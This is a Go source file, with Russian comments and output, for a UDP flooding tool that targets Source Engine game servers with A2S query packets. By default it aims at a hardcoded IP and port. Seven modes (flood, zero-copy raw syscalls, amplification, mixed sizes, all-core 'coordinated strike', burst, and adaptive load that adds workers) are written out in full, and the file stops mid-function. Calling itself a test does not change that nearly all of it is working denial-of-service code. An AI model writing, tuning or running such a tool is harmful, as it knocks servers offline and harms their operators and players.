package main

import (
	"bufio"
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// Конфигурация через флаги
var (
	ServerIP         = flag.String("ip", "185.189.255.121", "IP адрес сервера")
	ServerPort       = flag.Int("port", 25015, "Порт сервера")
	Mode             = flag.Int("mode", 1, "Режим атаки (1-7)")
	Duration         = flag.Int("duration", 60, "Длительность в секундах")
	Goroutines       = flag.Int("goroutines", 1000, "Количество горутин")
	ThreadsPerCore   = flag.Int("threads-per-core", 100, "Горутин на ядро CPU (режим 5)")
	TotalRequests    = flag.Int("requests", 1000000, "Всего запросов (режим 6)")
	BatchSize        = flag.Int("batch", 100, "Размер батча для отправки")
	ConnectionPool   = flag.Int("pool-size", 100, "Размер пула соединений")
	AdaptiveMode     = flag.Bool("adaptive", false, "Адаптивная подстройка нагрузки")
	DetailedStats    = flag.Bool("detailed", true, "Детальная статистика")
)

// Глобальные счетчики (оптимизированные с padding для избежания false sharing)
type PaddedCounter struct {
	value uint64
	_pad  [56]byte // Cache line padding (64 bytes total)
}

var (
	totalSent       PaddedCounter
	totalReceived   PaddedCounter
	totalBytes      PaddedCounter
	totalErrors     PaddedCounter
	currentRate     PaddedCounter
	peakRate        PaddedCounter
	totalSyscalls   PaddedCounter
	packetsPerBatch PaddedCounter
)

// Статистика производительности
type PerformanceStats struct {
	startTime       time.Time
	lastReportTime  time.Time
	lastSentCount   uint64
	instantRates    []uint64
	cpuUsage        []float64
	memoryUsage     []uint64
	mu              sync.Mutex
}

var perfStats PerformanceStats

// Цвета для терминала
const (
	ColorReset  = "\033[0m"
	ColorRed    = "\033[31m"
	ColorGreen  = "\033[32m"
	ColorYellow = "\033[33m"
	ColorBlue   = "\033[34m"
	ColorPurple = "\033[35m"
	ColorCyan   = "\033[36m"
	ColorWhite  = "\033[37m"
	ColorBold   = "\033[1m"
)

// Пул UDP соединений
type UDPConnectionPool struct {
	connections chan *net.UDPConn
	addr        *net.UDPAddr
	size        int
}

func NewUDPConnectionPool(addr *net.UDPAddr, size int) (*UDPConnectionPool, error) {
	pool := &UDPConnectionPool{
		connections: make(chan *net.UDPConn, size),
		addr:        addr,
		size:        size,
	}

	for i := 0; i < size; i++ {
		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			return nil, err
		}

		// Оптимизация буферов сокета
		conn.SetWriteBuffer(1024 * 1024) // 1MB write buffer
		pool.connections <- conn
	}

	return pool, nil
}

func (p *UDPConnectionPool) Get() *net.UDPConn {
	return <-p.connections
}

func (p *UDPConnectionPool) Put(conn *net.UDPConn) {
	select {
	case p.connections <- conn:
	default:
		conn.Close()
	}
}

func (p *UDPConnectionPool) Close() {
	close(p.connections)
	for conn := range p.connections {
		conn.Close()
	}
}

// Пул памяти для пакетов
var packetPool = sync.Pool{
	New: func() interface{} {
		return make([]byte, 1500) // MTU size
	},
}

// Создание пакетов Source Engine Query
func createA2SInfoRequest() []byte {
	packet := packetPool.Get().([]byte)[:25]
	binary.LittleEndian.PutUint32(packet[0:4], 0xFFFFFFFF)
	packet[4] = 0x54
	copy(packet[5:], []byte("Source Engine Query\x00"))
	return packet
}

func createA2SPlayerRequest() []byte {
	packet := packetPool.Get().([]byte)[:9]
	binary.LittleEndian.PutUint32(packet[0:4], 0xFFFFFFFF)
	packet[4] = 0x55
	binary.LittleEndian.PutUint32(packet[5:9], 0xFFFFFFFF)
	return packet
}

func createA2SRulesRequest() []byte {
	packet := packetPool.Get().([]byte)[:9]
	binary.LittleEndian.PutUint32(packet[0:4], 0xFFFFFFFF)
	packet[4] = 0x56
	binary.LittleEndian.PutUint32(packet[5:9], 0xFFFFFFFF)
	return packet
}

// Предаллоцированные пакеты
var (
	preAllocatedPackets [][]byte
	packetsMutex        sync.Mutex
)

func initPackets() {
	packetsMutex.Lock()
	defer packetsMutex.Unlock()

	preAllocatedPackets = [][]byte{
		createA2SInfoRequest(),
		createA2SPlayerRequest(),
		createA2SRulesRequest(),
	}

	// Добавляем пакеты разных размеров для mixed mode
	for size := 100; size <= 1400; size += 100 {
		packet := make([]byte, size)
		binary.LittleEndian.PutUint32(packet[0:4], 0xFFFFFFFF)
		packet[4] = 0x54
		preAllocatedPackets = append(preAllocatedPackets, packet)
	}
}

func repeat(char rune, count int) string {
	result := make([]rune, count)
	for i := range result {
		result[i] = char
	}
	return string(result)
}

func printHeader(title string) {
	fmt.Printf("\n%s%s%s%s\n", ColorBold, ColorCyan, repeat('=', 80), ColorReset)
	fmt.Printf("%s%s%s%s\n", ColorBold, ColorYellow, title, ColorReset)
	fmt.Printf("%s%s%s%s\n", ColorBold, ColorCyan, repeat('=', 80), ColorReset)
}

func formatNumber(n uint64) string {
	if n == 0 {
		return "0"
	}

	str := fmt.Sprintf("%d", n)
	if len(str) <= 3 {
		return str
	}

	result := ""
	for i, c := range str {
		if i > 0 && (len(str)-i)%3 == 0 {
			result += ","
		}
		result += string(c)
	}
	return result
}

func formatBytes(bytes uint64) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}
	div, exp := uint64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.2f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])
}

// Детальная статистика
func printDetailedStats(duration float64) {
	sent := atomic.LoadUint64(&totalSent.value)
	received := atomic.LoadUint64(&totalReceived.value)
	bytes := atomic.LoadUint64(&totalBytes.value)
	errors := atomic.LoadUint64(&totalErrors.value)
	syscalls := atomic.LoadUint64(&totalSyscalls.value)
	peak := atomic.LoadUint64(&peakRate.value)

	printHeader("РЕЗУЛЬТАТЫ ТЕСТИРОВАНИЯ")

	// Основная статистика
	fmt.Printf("%s┌─ Основная статистика%s\n", ColorCyan, ColorReset)
	fmt.Printf("%s│%s Время работы:          %s%.2f секунд%s\n", ColorCyan, ColorReset, ColorGreen, duration, ColorReset)
	fmt.Printf("%s│%s Отправлено запросов:   %s%s%s\n", ColorCyan, ColorReset, ColorGreen, formatNumber(sent), ColorReset)
	fmt.Printf("%s│%s Получено ответов:      %s%s%s\n", ColorCyan, ColorReset, ColorGreen, formatNumber(received), ColorReset)
	fmt.Printf("%s│%s Получено данных:       %s%s%s\n", ColorCyan, ColorReset, ColorGreen, formatBytes(bytes), ColorReset)
	fmt.Printf("%s│%s Ошибок:                %s%s%s\n", ColorCyan, ColorReset, ColorRed, formatNumber(errors), ColorReset)
	fmt.Printf("%s└%s\n", ColorCyan, ColorReset)

	// Производительность
	avgRate := float64(sent) / duration
	fmt.Printf("%s┌─ Производительность%s\n", ColorYellow, ColorReset)
	fmt.Printf("%s│%s Средняя скорость:      %s%s req/s%s\n", ColorYellow, ColorReset, ColorGreen, formatNumber(uint64(avgRate)), ColorReset)
	fmt.Printf("%s│%s Пиковая скорость:      %s%s req/s%s\n", ColorYellow, ColorReset, ColorGreen, formatNumber(peak), ColorReset)

	if syscalls > 0 {
		packetsPerSyscall := float64(sent) / float64(syscalls)
		fmt.Printf("%s│%s Системных вызовов:     %s%s%s\n", ColorYellow, ColorReset, ColorCyan, formatNumber(syscalls), ColorReset)
		fmt.Printf("%s│%s Пакетов на syscall:    %s%.2f%s\n", ColorYellow, ColorReset, ColorPurple, packetsPerSyscall, ColorReset)
	}
	fmt.Printf("%s└%s\n", ColorYellow, ColorReset)

	// Эффективность
	if sent > 0 {
		fmt.Printf("%s┌─ Эффективность%s\n", ColorPurple, ColorReset)
		if received > 0 {
			successRate := float64(received) / float64(sent) * 100
			fmt.Printf("%s│%s Успешность:            %s%.2f%%%s\n", ColorPurple, ColorReset, ColorGreen, successRate, ColorReset)
		}
		if bytes > 0 {
			amplification := float64(bytes) / float64(sent*9)
			fmt.Printf("%s│%s Коэффициент усиления:  %s%.2fx%s\n", ColorPurple, ColorReset, ColorCyan, amplification, ColorReset)

			avgResponseSize := float64(bytes) / float64(received)
			if received > 0 {
				fmt.Printf("%s│%s Средний размер ответа: %s%s%s\n", ColorPurple, ColorReset, ColorYellow, formatBytes(uint64(avgResponseSize)), ColorReset)
			}
		}

		throughput := float64(bytes) / duration / (1024 * 1024)
		fmt.Printf("%s│%s Пропускная способность:%s%.2f MB/s%s\n", ColorPurple, ColorReset, ColorGreen, throughput, ColorReset)
		fmt.Printf("%s└%s\n", ColorPurple, ColorReset)
	}

	// Системная информация
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	fmt.Printf("%s┌─ Системная информация%s\n", ColorBlue, ColorReset)
	fmt.Printf("%s│%s Использовано памяти:   %s%s%s\n", ColorBlue, ColorReset, ColorCyan, formatBytes(m.Alloc), ColorReset)
	fmt.Printf("%s│%s Всего выделено:        %s%s%s\n", ColorBlue, ColorReset, ColorCyan, formatBytes(m.TotalAlloc), ColorReset)
	fmt.Printf("%s│%s Горутин:               %s%d%s\n", ColorBlue, ColorReset, ColorYellow, runtime.NumGoroutine(), ColorReset)
	fmt.Printf("%s│%s CPU ядер:              %s%d%s\n", ColorBlue, ColorReset, ColorYellow, runtime.NumCPU(), ColorReset)
	fmt.Printf("%s└%s\n", ColorBlue, ColorReset)

	fmt.Printf("%s%s%s%s\n", ColorBold, ColorCyan, repeat('=', 80), ColorReset)
}

// Быстрая отправка через syscall (zero-copy)
func sendBatchSyscall(conn *net.UDPConn, packets [][]byte, addr *syscall.SockaddrInet4) (int, error) {
	file, err := conn.File()
	if err != nil {
		return 0, err
	}
	defer file.Close()

	fd := syscall.Handle(file.Fd())
	sent := 0

	for _, packet := range packets {
		err = syscall.Sendto(fd, packet, 0, addr)
		if err != nil {
			return sent, err
		}
		sent++
	}

	atomic.AddUint64(&totalSyscalls.value, uint64(len(packets)))
	return sent, nil
}

// РЕЖИМ 1: Extreme UDP Flood с пулом соединений и батчингом
func extremeUDPFloodOptimized(duration, goroutines int) {
	printHeader("РЕЖИМ 1: EXTREME UDP FLOOD (OPTIMIZED)")
	fmt.Printf("Длительность:         %d секунд\n", duration)
	fmt.Printf("Горутин:              %d\n", goroutines)
	fmt.Printf("Размер батча:         %d пакетов\n", *BatchSize)
	fmt.Printf("Пул соединений:       %d\n", *ConnectionPool)
	fmt.Printf("Использование CPU:    %d ядер\n", runtime.NumCPU())
	fmt.Printf("%s%s%s\n", ColorCyan, repeat('=', 80), ColorReset)

	atomic.StoreUint64(&totalSent.value, 0)
	atomic.StoreUint64(&totalReceived.value, 0)
	atomic.StoreUint64(&totalErrors.value, 0)
	atomic.StoreUint64(&totalSyscalls.value, 0)
	atomic.StoreUint64(&peakRate.value, 0)

	addr, _ := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", *ServerIP, *ServerPort))

	// Создаем пул соединений
	pool, err := NewUDPConnectionPool(addr, *ConnectionPool)
	if err != nil {
		fmt.Printf("%sОшибка создания пула: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	defer pool.Close()

	stopChan := make(chan bool)
	var wg sync.WaitGroup

	// Оптимизированный воркер с батчингом
	worker := func() {
		defer wg.Done()

		// Подготавливаем батч пакетов
		batch := make([][]byte, *BatchSize)
		for i := 0; i < *BatchSize; i++ {
			batch[i] = preAllocatedPackets[i%3]
		}

		localCount := uint64(0)
		reportInterval := uint64(1000)

		for {
			select {
			case <-stopChan:
				atomic.AddUint64(&totalSent.value, localCount)
				return
			default:
				conn := pool.Get()

				// Отправляем батч
				for _, packet := range batch {
					_, err := conn.Write(packet)
					if err != nil {
						atomic.AddUint64(&totalErrors.value, 1)
					} else {
						localCount++
					}
				}

				pool.Put(conn)

				// Периодически обновляем глобальный счетчик
				if localCount >= reportInterval {
					atomic.AddUint64(&totalSent.value, reportInterval)
					localCount -= reportInterval
				}
			}
		}
	}

	// Запуск воркеров
	startTime := time.Now()
	perfStats.startTime = startTime
	perfStats.lastReportTime = startTime

	for i := 0; i < goroutines; i++ {
		wg.Add(1)
		go worker()
	}

	// Расширенный мониторинг
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		lastSent := uint64(0)

		for {
			select {
			case <-stopChan:
				return
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				sent := atomic.LoadUint64(&totalSent.value)
				errors := atomic.LoadUint64(&totalErrors.value)

				// Мгновенная скорость
				instantRate := sent - lastSent
				instantRatePerSec := uint64(float64(instantRate) * 2) // *2 потому что тикер 500ms
				lastSent = sent

				// Обновляем пиковую скорость
				currentPeak := atomic.LoadUint64(&peakRate.value)
				if instantRatePerSec > currentPeak {
					atomic.StoreUint64(&peakRate.value, instantRatePerSec)
				}

				avgRate := float64(sent) / elapsed

				if *DetailedStats {
					var m runtime.MemStats
					runtime.ReadMemStats(&m)

					fmt.Printf("\r%s[%.1fs]%s Sent: %s%s%s | Avg: %s%s/s%s | Now: %s%s/s%s | Peak: %s%s/s%s | Err: %s%s%s | Mem: %s%s%s | Goroutines: %s%d%s     ",
						ColorYellow, elapsed, ColorReset,
						ColorGreen, formatNumber(sent), ColorReset,
						ColorCyan, formatNumber(uint64(avgRate)), ColorReset,
						ColorPurple, formatNumber(instantRatePerSec), ColorReset,
						ColorBlue, formatNumber(atomic.LoadUint64(&peakRate.value)), ColorReset,
						ColorRed, formatNumber(errors), ColorReset,
						ColorWhite, formatBytes(m.Alloc), ColorReset,
						ColorYellow, runtime.NumGoroutine(), ColorReset)
				} else {
					fmt.Printf("\r%s[%.1fs]%s Sent: %s%s%s | Speed: %s%s/s%s | Peak: %s%s/s%s     ",
						ColorYellow, elapsed, ColorReset,
						ColorGreen, formatNumber(sent), ColorReset,
						ColorCyan, formatNumber(instantRatePerSec), ColorReset,
						ColorBlue, formatNumber(atomic.LoadUint64(&peakRate.value)), ColorReset)
				}
			}
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stopChan)
	wg.Wait()

	fmt.Println() // Новая строка после прогресса
	printDetailedStats(time.Since(startTime).Seconds())
}

// РЕЖИМ 2: Raw Speed с zero-copy операциями
func rawSpeedFloodZeroCopy(duration, goroutines int) {
	printHeader("РЕЖИМ 2: RAW SPEED FLOOD (ZERO-COPY SYSCALLS)")
	fmt.Printf("Длительность:         %d секунд\n", duration)
	fmt.Printf("Горутин:              %d\n", goroutines)
	fmt.Printf("Размер батча:         %d пакетов\n", *BatchSize)
	fmt.Printf("%sТОЛЬКО ОТПРАВКА - ZERO-COPY!%s\n", ColorRed, ColorReset)
	fmt.Printf("%s%s%s\n", ColorCyan, repeat('=', 80), ColorReset)

	atomic.StoreUint64(&totalSent.value, 0)
	atomic.StoreUint64(&totalSyscalls.value, 0)
	atomic.StoreUint64(&peakRate.value, 0)

	addr, _ := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", *ServerIP, *ServerPort))

	// Подготавливаем sockaddr для syscall
	var sockaddr syscall.SockaddrInet4
	sockaddr.Port = *ServerPort
	copy(sockaddr.Addr[:], addr.IP.To4())

	stopChan := make(chan bool)
	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()

		conn, err := net.DialUDP("udp", nil, addr)
		if err != nil {
			return
		}
		defer conn.Close()

		conn.SetWriteBuffer(2 * 1024 * 1024) // 2MB buffer

		// Получаем raw socket fd
		file, err := conn.File()
		if err != nil {
			return
		}
		fd := syscall.Handle(file.Fd())

		// Подготавливаем батч
		batch := make([][]byte, *BatchSize)
		for i := 0; i < *BatchSize; i++ {
			batch[i] = preAllocatedPackets[i%3]
		}

		localCount := uint64(0)
		syscallCount := uint64(0)

		for {
			select {
			case <-stopChan:
				atomic.AddUint64(&totalSent.value, localCount)
				atomic.AddUint64(&totalSyscalls.value, syscallCount)
				file.Close()
				return
			default:
				// Отправляем батч через syscall
				for _, packet := range batch {
					err := syscall.Sendto(fd, packet, 0, &sockaddr)
					if err == nil {
						localCount++
					}
				}
				syscallCount += uint64(len(batch))

				// Периодически синхронизируем счетчики
				if localCount >= 10000 {
					atomic.AddUint64(&totalSent.value, 10000)
					localCount -= 10000
				}
			}
		}
	}

	startTime := time.Now()
	for i := 0; i < goroutines; i++ {
		wg.Add(1)
		go worker()
	}

	// Мониторинг
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		lastSent := uint64(0)

		for {
			select {
			case <-stopChan:
				return
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				sent := atomic.LoadUint64(&totalSent.value)
				syscalls := atomic.LoadUint64(&totalSyscalls.value)

				instantRate := uint64(float64(sent-lastSent) * 2)
				lastSent = sent

				currentPeak := atomic.LoadUint64(&peakRate.value)
				if instantRate > currentPeak {
					atomic.StoreUint64(&peakRate.value, instantRate)
				}

				avgRate := float64(sent) / elapsed
				packetsPerSyscall := float64(0)
				if syscalls > 0 {
					packetsPerSyscall = float64(sent) / float64(syscalls)
				}

				fmt.Printf("\r%s[%.1fs]%s Sent: %s%s%s | Avg: %s%s/s%s | Now: %s%s/s%s | Peak: %s%s/s%s | P/Syscall: %s%.2f%s     ",
					ColorYellow, elapsed, ColorReset,
					ColorGreen, formatNumber(sent), ColorReset,
					ColorCyan, formatNumber(uint64(avgRate)), ColorReset,
					ColorPurple, formatNumber(instantRate), ColorReset,
					ColorBlue, formatNumber(atomic.LoadUint64(&peakRate.value)), ColorReset,
					ColorWhite, packetsPerSyscall, ColorReset)
			}
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stopChan)
	wg.Wait()

	fmt.Println()
	printDetailedStats(time.Since(startTime).Seconds())
}

// РЕЖИМ 3: Amplification Attack (оптимизированный)
func amplificationAttackOptimized(duration, goroutines int) {
	printHeader("РЕЖИМ 3: AMPLIFICATION ATTACK (OPTIMIZED)")
	fmt.Printf("Длительность:         %d секунд\n", duration)
	fmt.Printf("Горутин:              %d\n", goroutines)
	fmt.Printf("Пул соединений:       %d\n", *ConnectionPool)
	fmt.Printf("%s%s%s\n", ColorCyan, repeat('=', 80), ColorReset)

	atomic.StoreUint64(&totalSent.value, 0)
	atomic.StoreUint64(&totalReceived.value, 0)
	atomic.StoreUint64(&totalBytes.value, 0)
	atomic.StoreUint64(&peakRate.value, 0)

	addr, _ := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", *ServerIP, *ServerPort))
	pool, err := NewUDPConnectionPool(addr, *ConnectionPool)
	if err != nil {
		fmt.Printf("%sОшибка: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	defer pool.Close()

	stopChan := make(chan bool)
	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()

		buffer := make([]byte, 65535)
		rulesRequest := createA2SRulesRequest()
		localSent := uint64(0)
		localReceived := uint64(0)
		localBytes := uint64(0)

		for {
			select {
			case <-stopChan:
				atomic.AddUint64(&totalSent.value, localSent)
				atomic.AddUint64(&totalReceived.value, localReceived)
				atomic.AddUint64(&totalBytes.value, localBytes)
				return
			default:
				conn := pool.Get()

				conn.Write(rulesRequest)
				localSent++

				conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
				n, err := conn.Read(buffer)
				if err == nil && n > 0 {
					localReceived++
					localBytes += uint64(n)
				}

				pool.Put(conn)

				if localSent%100 == 0 {
					atomic.AddUint64(&totalSent.value, 100)
					localSent = 0
					if localReceived > 0 {
						atomic.AddUint64(&totalReceived.value, localReceived)
						atomic.AddUint64(&totalBytes.value, localBytes)
						localReceived = 0
						localBytes = 0
					}
				}
			}
		}
	}

	startTime := time.Now()
	for i := 0; i < goroutines; i++ {
		wg.Add(1)
		go worker()
	}

	// Мониторинг
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		lastSent := uint64(0)

		for {
			select {
			case <-stopChan:
				return
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				sent := atomic.LoadUint64(&totalSent.value)
				received := atomic.LoadUint64(&totalReceived.value)
				bytes := atomic.LoadUint64(&totalBytes.value)

				instantRate := uint64(float64(sent-lastSent) * 2)
				lastSent = sent

				currentPeak := atomic.LoadUint64(&peakRate.value)
				if instantRate > currentPeak {
					atomic.StoreUint64(&peakRate.value, instantRate)
				}

				avgRate := float64(sent) / elapsed
				amplification := float64(0)
				if sent > 0 && bytes > 0 {
					amplification = float64(bytes) / float64(sent*9)
				}

				fmt.Printf("\r%s[%.1fs]%s Sent: %s%s%s | Recv: %s%s%s | Data: %s%s%s | Amp: %s%.2fx%s | Speed: %s%s/s%s     ",
					ColorYellow, elapsed, ColorReset,
					ColorGreen, formatNumber(sent), ColorReset,
					ColorCyan, formatNumber(received), ColorReset,
					ColorPurple, formatBytes(bytes), ColorReset,
					ColorBlue, amplification, ColorReset,
					ColorWhite, formatNumber(uint64(avgRate)), ColorReset)
			}
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stopChan)
	wg.Wait()

	fmt.Println()
	printDetailedStats(time.Since(startTime).Seconds())
}

// РЕЖИМ 4: Mixed Size Attack (оптимизированный)
func mixedSizeAttackOptimized(duration, goroutines int) {
	printHeader("РЕЖИМ 4: MIXED SIZE ATTACK (OPTIMIZED)")
	fmt.Printf("Длительность:         %d секунд\n", duration)
	fmt.Printf("Горутин:              %d\n", goroutines)
	fmt.Printf("Типов пакетов:        %d (100-1400 байт)\n", len(preAllocatedPackets))
	fmt.Printf("%s%s%s\n", ColorCyan, repeat('=', 80), ColorReset)

	atomic.StoreUint64(&totalSent.value, 0)
	atomic.StoreUint64(&peakRate.value, 0)

	addr, _ := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", *ServerIP, *ServerPort))
	pool, err := NewUDPConnectionPool(addr, *ConnectionPool)
	if err != nil {
		fmt.Printf("%sОшибка: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	defer pool.Close()

	stopChan := make(chan bool)
	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()

		idx := 0
		localCount := uint64(0)
		packetsCount := len(preAllocatedPackets)

		for {
			select {
			case <-stopChan:
				atomic.AddUint64(&totalSent.value, localCount)
				return
			default:
				conn := pool.Get()

				// Отправляем батч разных пакетов
				for i := 0; i < *BatchSize; i++ {
					conn.Write(preAllocatedPackets[idx])
					idx = (idx + 1) % packetsCount
					localCount++
				}

				pool.Put(conn)

				if localCount >= 1000 {
					atomic.AddUint64(&totalSent.value, 1000)
					localCount -= 1000
				}
			}
		}
	}

	startTime := time.Now()
	for i := 0; i < goroutines; i++ {
		wg.Add(1)
		go worker()
	}

	// Мониторинг
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		lastSent := uint64(0)

		for {
			select {
			case <-stopChan:
				return
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				sent := atomic.LoadUint64(&totalSent.value)

				instantRate := uint64(float64(sent-lastSent) * 2)
				lastSent = sent

				currentPeak := atomic.LoadUint64(&peakRate.value)
				if instantRate > currentPeak {
					atomic.StoreUint64(&peakRate.value, instantRate)
				}

				avgRate := float64(sent) / elapsed

				fmt.Printf("\r%s[%.1fs]%s Sent: %s%s%s | Avg: %s%s/s%s | Now: %s%s/s%s | Peak: %s%s/s%s     ",
					ColorYellow, elapsed, ColorReset,
					ColorGreen, formatNumber(sent), ColorReset,
					ColorCyan, formatNumber(uint64(avgRate)), ColorReset,
					ColorPurple, formatNumber(instantRate), ColorReset,
					ColorBlue, formatNumber(atomic.LoadUint64(&peakRate.value)), ColorReset)
			}
		}
	}()

	time.Sleep(time.Duration(duration) * time.Second)
	close(stopChan)
	wg.Wait()

	fmt.Println()
	printDetailedStats(time.Since(startTime).Seconds())
}

// РЕЖИМ 5: Coordinated Strike (все ядра CPU)
func coordinatedStrikeOptimized(duration, threadsPerCore int) {
	cpuCount := runtime.NumCPU()
	totalGoroutines := cpuCount * threadsPerCore

	printHeader("РЕЖИМ 5: COORDINATED STRIKE (ВСЕ ЯДРА CPU)")
	fmt.Printf("Обнаружено ядер CPU:  %d\n", cpuCount)
	fmt.Printf("Горутин на ядро:      %d\n", threadsPerCore)
	fmt.Printf("%sВСЕГО ГОРУТИН:         %d%s\n", ColorRed, totalGoroutines, ColorReset)
	fmt.Printf("Длительность:         %d секунд\n", duration)
	fmt.Printf("%s%s%s\n", ColorCyan, repeat('=', 80), ColorReset)

	runtime.GOMAXPROCS(cpuCount)
	extremeUDPFloodOptimized(duration, totalGoroutines)
}

// РЕЖИМ 6: Burst Attack (оптимизированный)
func burstAttackOptimized(totalRequests, concurrentGoroutines int) {
	printHeader("РЕЖИМ 6: BURST ATTACK (OPTIMIZED)")
	fmt.Printf("Всего запросов:       %s\n", formatNumber(uint64(totalRequests)))
	fmt.Printf("Горутин:              %d\n", concurrentGoroutines)
	fmt.Printf("Размер батча:         %d\n", *BatchSize)
	fmt.Printf("%s%s%s\n", ColorCyan, repeat('=', 80), ColorReset)

	atomic.StoreUint64(&totalSent.value, 0)
	atomic.StoreUint64(&peakRate.value, 0)

	addr, _ := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", *ServerIP, *ServerPort))
	pool, err := NewUDPConnectionPool(addr, *ConnectionPool)
	if err != nil {
		fmt.Printf("%sОшибка: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	defer pool.Close()

	requestsPerWorker := totalRequests / concurrentGoroutines
	var wg sync.WaitGroup
	stopChan := make(chan bool)

	worker := func(requests int) {
		defer wg.Done()

		localCount := 0
		for localCount < requests {
			select {
			case <-stopChan:
				return
			default:
				conn := pool.Get()

				batchSize := *BatchSize
				if requests-localCount < batchSize {
					batchSize = requests - localCount
				}

				for i := 0; i < batchSize; i++ {
					packet := preAllocatedPackets[i%3]
					conn.Write(packet)
					localCount++
					atomic.AddUint64(&totalSent.value, 1)
				}

				pool.Put(conn)
			}
		}
	}

	startTime := time.Now()

	// Мониторинг
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		lastSent := uint64(0)

		for {
			select {
			case <-stopChan:
				return
			case <-ticker.C:
				sent := atomic.LoadUint64(&totalSent.value)
				progress := float64(sent) / float64(totalRequests) * 100

				instantRate := uint64(float64(sent-lastSent) * 2)
				lastSent = sent

				currentPeak := atomic.LoadUint64(&peakRate.value)
				if instantRate > currentPeak {
					atomic.StoreUint64(&peakRate.value, instantRate)
				}

				elapsed := time.Since(startTime).Seconds()
				avgRate := float64(sent) / elapsed

				fmt.Printf("\r%sПрогресс:%s %.1f%% (%s / %s) | Avg: %s%s/s%s | Now: %s%s/s%s | Peak: %s%s/s%s     ",
					ColorYellow, ColorReset, progress,
					formatNumber(sent), formatNumber(uint64(totalRequests)),
					ColorCyan, formatNumber(uint64(avgRate)), ColorReset,
					ColorPurple, formatNumber(instantRate), ColorReset,
					ColorBlue, formatNumber(atomic.LoadUint64(&peakRate.value)), ColorReset)
			}
		}
	}()

	for i := 0; i < concurrentGoroutines; i++ {
		wg.Add(1)
		go worker(requestsPerWorker)
	}

	wg.Wait()
	close(stopChan)

	fmt.Println()
	printDetailedStats(time.Since(startTime).Seconds())
}

// РЕЖИМ 7: Adaptive Load (новый режим)
func adaptiveLoadAttack(duration, initialGoroutines int) {
	printHeader("РЕЖИМ 7: ADAPTIVE LOAD (САМОПОДСТРОЙКА)")
	fmt.Printf("Длительность:         %d секунд\n", duration)
	fmt.Printf("Начальных горутин:    %d\n", initialGoroutines)
	fmt.Printf("%sАВТОМАТИЧЕСКАЯ ПОДСТРОЙКА НАГРУЗКИ%s\n", ColorGreen, ColorReset)
	fmt.Printf("%s%s%s\n", ColorCyan, repeat('=', 80), ColorReset)

	atomic.StoreUint64(&totalSent.value, 0)
	atomic.StoreUint64(&totalErrors.value, 0)
	atomic.StoreUint64(&peakRate.value, 0)

	addr, _ := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", *ServerIP, *ServerPort))
	pool, err := NewUDPConnectionPool(addr, *ConnectionPool)
	if err != nil {
		fmt.Printf("%sОшибка: %v%s\n", ColorRed, err, ColorReset)
		return
	}
	defer pool.Close()

	stopChan := make(chan bool)
	var wg sync.WaitGroup
	currentGoroutines := int32(0)

	worker := func() {
		defer wg.Done()
		atomic.AddInt32(&currentGoroutines, 1)
		defer atomic.AddInt32(&currentGoroutines, -1)

		batch := make([][]byte, *BatchSize)
		for i := 0; i < *BatchSize; i++ {
			batch[i] = preAllocatedPackets[i%3]
		}

		localCount := uint64(0)

		for {
			select {
			case <-stopChan:
				atomic.AddUint64(&totalSent.value, localCount)
				return
			default:
				conn := pool.Get()

				for _, packet := range batch {
					_, err := conn.Write(packet)
					if err != nil {
						atomic.AddUint64(&totalErrors.value, 1)
					} else {
						localCount++
					}
				}

				pool.Put(conn)

				if localCount >= 1000 {
					atomic.AddUint64(&totalSent.value, 1000)
					localCount -= 1000
				}
			}
		}
	}

	// Запускаем начальные воркеры
	startTime := time.Now()
	for i := 0; i < initialGoroutines; i++ {
		wg.Add(1)
		go worker()
	}

	// Адаптивный контроллер
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		lastSent := uint64(0)
		lastRate := uint64(0)

		for {
			select {
			case <-stopChan:
				return
			case <-ticker.C:
				sent := atomic.LoadUint64(&totalSent.value)
				errors := atomic.LoadUint64(&totalErrors.value)
				currentRate := (sent - lastSent) / 2 // за 2 секунды

				// Анализируем производительность
				errorRate := float64(0)
				if sent > 0 {
					errorRate = float64(errors) / float64(sent) * 100
				}

				goroutines := atomic.LoadInt32(&currentGoroutines)

				// Адаптивная логика
				if currentRate > lastRate && errorRate < 1.0 && goroutines < 10000 {
					// Производительность растет - добавляем воркеров
					newWorkers := int(float64(goroutines) * 0.1) // +10%
					if newWorkers < 10 {
						newWorkers = 10
					}

					fmt.Printf("\n%s[ADAPTIVE]%s Увеличиваем нагрузку: +%d воркеров (всего: %d)\n",
